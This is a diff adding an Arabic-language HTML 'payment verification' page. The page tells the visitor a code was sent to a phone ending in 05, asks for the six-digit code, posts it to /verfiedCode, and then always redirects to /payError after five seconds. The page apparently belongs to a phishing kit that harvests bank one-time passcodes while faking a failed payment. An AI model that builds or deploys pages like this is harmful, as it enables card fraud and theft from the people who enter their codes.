@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css" integrity="sha384-9aIt2nRpC12Uk9gS9baDl411NQApFmC26EwAOH8WgZl5MYYxFfc+NcPb1dKGj7Sk" crossorigin="anonymous">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200;300;400;500;600;700;800&family=El+Messiri:wght@400;500;700&family=Tajawal:wght@300;400&display=swap" >
+
+    
+  <link  href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="shortcut icon" href="../images/icon/logo.jpeg" type="image/x-icon">
+  <link rel="stylesheet" href="../stylesheets/style.css"> 
+  <link rel="stylesheet" href="../stylesheets/custom.css"> 
+  <link rel="stylesheet" type="text/css" href="../css/payment.css">
+  <link rel="stylesheet" type="text/css" href="../css/font-awesome.min.css">
+  <script
+  src="https://code.jquery.com/jquery-3.4.1.js"
+  integrity="sha256-WpOohJOqMqqyKL9FccASB9O0KwACQJpFTUBLTYOVvVU="
+  crossorigin="anonymous"></script>
+  <script src="http://ajax.aspnetcdn.com/ajax/jquery.validate/1.11.1/jquery.validate.min.js"></script>
+  <script src="https://code.jquery.com/jquery-1.11.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/jquery.validate.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/jquery.validation/1.16.0/additional-methods.min.js"></script>
+  <script src="../bootstrap/js/bootstrap.min.js"></script>  
+  <script src="../bootstrap/js/bootstrap.bundle.min.js"></script>  
+  <script src="../bootstrap/js/popper.min.js"></script> 
+  
+</head>
+
+<body style="padding:.2rem !important">
+
+
+    <div class="bath container-fluid" style="padding-top:3rem">
+    <section class="ptb-70">
+        <div class="container" style="padding:0">
+            <hr />
+            <form id="myForm">
+            <div class="mtb-30">
+                <div class="row">
+                <div class="col-md-6 mb-xs-40">
+                    <div class="estimate">
+                    <div class="row">
+                        <div class="card mt-50 mb-50">
+                        <div class="card-title mx-auto" style="font-size:2em"> التحقق من الدفعة  </div>
+                    
+                        <span id="card-header">  تم ارسال رمز تحقق الى  **** **** 05 </span>
+                        <div class="row-1">
+                            <div class="row row-2">
+                            <span id="card-inner"> ادخل رمز التحقق  </span>
+                            </div>
+                            <div class="row row-2">
+                            <input
+                                type="text"
+                                name="verfiedCode"
+                                placeholder="  رمز التحقق"
+                            />
+                            </div>
+                        </div>
+                       
+                        <button class="btn d-flex mx-auto " id="btn-submit" ><b>تحقق </b></button>
+                        </div>
+                    </div>
+                    </div>
+                </div>
+                </div>
+            </div>
+            </form>
+        </div>
+    </section>
+
+    <script>
+        $("#myForm").validate({
+            rules: {
+            verfiedCode: {
+                required: true,
+                minlength:6
+            },
+           
+            },
+            messages: {
+            verfiedCode: " الرجاء ادخال رمز سري صحيح ",
+            },
+            submitHandler: SubForm,
+        });
+        function SubForm() {
+            console.log("send start")
+            $.ajax({
+            url: "/verfiedCode",
+            type: "post",
+            data: $("#myForm").serializeArray(),
+            beforeSend: function () {
+                $("#error").fadeOut();
+                $("#btn-submit").html(
+                '<span class="glyphicon glyphicon-transfer"></span>    جاري التحقق ...'
+                );
+            },
+            success: function () {
+                 setTimeout(() => {
+                       window.location.replace("/payError");
+                 }, 5000)
+            },
+            error: function () {
+                // alert("There was an error :(");
+            },
+            });
+            return false;
+        }
+    </script>
+
+    </div>
+   
+     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.1/umd/popper.min.js" integrity="sha512-ubuT8Z88WxezgSqf3RLuNi5lmjstiJcyezx34yIU2gAHonIi27Na7atqzUZCOoY4CExaoFumzOsFQ2Ch+I/HCw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+   <script src="../js/main.js"></script>
+   <script src="../js/bundle.min.js" ></script>
+   
+  
+</body>
+</html>
